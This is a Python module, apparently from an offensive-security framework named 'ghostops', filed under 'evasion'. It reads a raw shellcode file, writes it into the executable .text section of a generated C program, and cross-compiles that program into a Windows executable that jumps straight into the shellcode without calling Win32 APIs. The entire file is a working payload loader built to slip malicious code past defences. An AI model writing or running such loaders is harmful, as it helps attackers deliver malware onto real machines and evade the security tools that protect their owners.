import subprocess
from pathlib import Path
from ghostops.common.utils import Logger
from ghostops.core.base_module import BaseModule


class NoApiExec(BaseModule):
    name = "NoApiExec"
    description = "Generates a PE that runs shellcode without using Win32 APIs."
    author = "Awagat Dhungana <4w4647@gmail.com>"
    category = "evasion"
    os = ["windows"]
    arch = ["x86", "x64"]

    @staticmethod
    def register_arguments(parser):
        parser.add_argument(
            "--arch",
            required=True,
            type=str,
            choices=["x86", "x64"],
            help="Architecture to compile for (e.g., x86, x64)",
        )
        parser.add_argument(
            "--shellcode",
            required=True,
            type=str,
            help="Path to raw shellcode file (e.g., ghostops.bin)",
        )
        parser.add_argument(
            "--output",
            required=True,
            type=str,
            help="Output filename for portable executable (e.g., ghostops.exe)",
        )

    @staticmethod
    def run(args):
        shellcode_path = Path(args.shellcode)
        if not shellcode_path.exists():
            Logger.log("flaw", f"Shellcode file not found: {shellcode_path}")
            return

        try:
            with open(shellcode_path, "rb") as f:
                shellcode_bytes = f.read()
        except Exception as e:
            Logger.log("flaw", f"Failed to read shellcode: {e}")
            return

        shellcode_c_array = ",".join(f"0x{b:02x}" for b in shellcode_bytes)

        injector_template = f"""
__attribute__((section(".text")))
char goodcode[] = {{{shellcode_c_array}}};

int main() {{
    ((void(*)())goodcode)();
    return 0;
}}
"""

        c_template_path = Path("temp_shellcode.c")

        try:
            with open(c_template_path, "w") as cfile:
                cfile.write(injector_template)
        except Exception as e:
            Logger.log("flaw", f"Failed to write temp C file: {e}")
            return

        executable_path = Path(args.output)
        c_compiler_flag = "-m32" if args.arch == "x86" else "-m64"

        try:
            subprocess.run(
                [
                    "x86_64-w64-mingw32-gcc",
                    c_compiler_flag,
                    "-o",
                    str(executable_path),
                    str(c_template_path),
                ],
                check=True,
            )
        except subprocess.CalledProcessError as e:
            Logger.log("flaw", f"Compilation failed: {e}")
            return
        finally:
            try:
                c_template_path.unlink()
            except Exception:
                pass

        try:
            output_size = executable_path.stat().st_size
            Logger.log("good", f"PE size: {output_size} bytes")
            Logger.log("good", f"PE compiled successfully: {executable_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to retrieve output file size: {e}")
